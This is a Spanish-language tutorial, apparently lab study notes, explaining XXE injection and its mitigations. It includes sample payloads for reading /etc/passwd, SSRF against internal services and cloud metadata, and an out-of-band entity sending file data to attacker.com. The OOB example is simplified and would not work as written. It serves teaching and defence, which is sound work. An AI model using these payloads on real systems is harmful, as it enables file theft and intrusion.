# XML External Entity Injection

## 🔧 Qué es una vulnerabilidad XXE

Una **XXE injection** es una vulnerabilidad de seguridad web que ocurre cuando una aplicación procesa datos XML de forma insegura. Esto permite a un atacante:

* Leer archivos arbitrarios del servidor (como `/etc/passwd`).
* Realizar ataques SSRF.
* Exfiltrar datos de forma encubierta (blind XXE).

La causa principal es que muchos parsers XML soportan por defecto funcionalidades peligrosas como las **entidades externas**, sin requerir que la aplicación las use intencionalmente.

---

## 🤖 Qué son las entidades externas en XML

XML permite definir **entidades externas** en la sección `DOCTYPE`, que pueden cargar contenido desde archivos locales o URLs externas. Ejemplo:

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
```

Esta entidad `xxe` representará el contenido del archivo `/etc/passwd`, si el parser lo permite. Luego, podrá utilizarse en cualquier parte del XML como `&xxe;`.

---

## 🤷‍♂️ Por qué surgen las vulnerabilidades XXE

* Muchas aplicaciones utilizan XML para transmitir datos entre cliente y servidor (por ejemplo, en APIs SOAP o sistemas legados).
* Usan bibliotecas como `libxml`, `XMLParser`, etc. que admiten entidades externas por defecto.
* Si la configuración no desactiva esas funcionalidades, un atacante podrá aprovecharlas para manipular la forma en que se procesan los datos.

---

## 📊 Tipos de ataques XXE

### 1. ✅ **Lectura de archivos locales**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
  <productId>&xxe;</productId>
</stockCheck>
```

Esto causará que el contenido de `/etc/passwd` se inserte en el lugar de `&xxe;` y sea devuelto en la respuesta si se incluye.

### 2. 📡 **SSRF)**

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.service.local/admin"> ]>
```

Esto puede ser usado para escanear servicios internos o atacar metadata APIs (ej. `http://169.254.169.254` en AWS).

### 3. 🔒 **Blind XXE con exfiltración OOB (Out-of-band)**

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://attacker.com/exfil?data=file:///etc/passwd"> ]>
```

El servidor hace la solicitud, filtrando información al dominio del atacante.

### 4. 💡 **Blind XXE por error**

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
  <productId>&xxe;&invalid;</productId>
</stockCheck>
```

Puede generar errores que revelen partes del contenido si el parser no puede manejar el resultado.

---

## 🔢 Detección sistemática de XXE

En escenarios reales, el XML puede tener varios nodos. El atacante debe probar su entidad `&xxe;` en cada nodo individual y observar en cuál se refleja su valor. Por ejemplo:

```xml
<order>
  <client>&xxe;</client>
  <productId>42</productId>
  <comments>Urgente</comments>
</order>
```

---

[Lab: Exploiting XXE using external entities to retrieve files](1_Exploiting_XXE_using_external_entities_to_retrieve_files.mdd)  

![Practitioner](https://img.shields.io/badge/level-Apprentice-green) 

---

## 🚫 Mitigación y mejores prácticas

* ❌ No uses parsers XML inseguros o con configuraciones por defecto.
* ✅ Deshabilitá resolución de entidades externas (ej. `disableEntityExpansion=true`).
* ✉️ Usá formatos más seguros como JSON.
* ⛨️ Aplicá control de salida: nunca reflejes ciegamente contenido XML procesado.

---


